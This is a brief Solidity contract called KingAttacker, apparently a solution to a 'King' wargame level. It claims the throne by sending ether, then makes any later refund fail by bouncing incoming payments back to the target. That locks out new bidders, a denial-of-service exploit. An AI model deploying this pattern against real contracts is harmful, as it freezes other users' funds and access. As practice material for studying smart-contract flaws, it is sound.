// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingAttacker {
    address payable kingContract;
    address payable public owner;

    constructor(address payable _kingContract) public payable {
        owner = msg.sender;
        kingContract = _kingContract;
    }

    function claimKing(uint256 _amount) external {
        require(msg.sender == owner);
        (bool success, ) = kingContract.call.value(_amount)("");

        require(success, "Transfer failed.");
    }

    receive() external payable {
        kingContract.transfer(msg.value);
    }
}
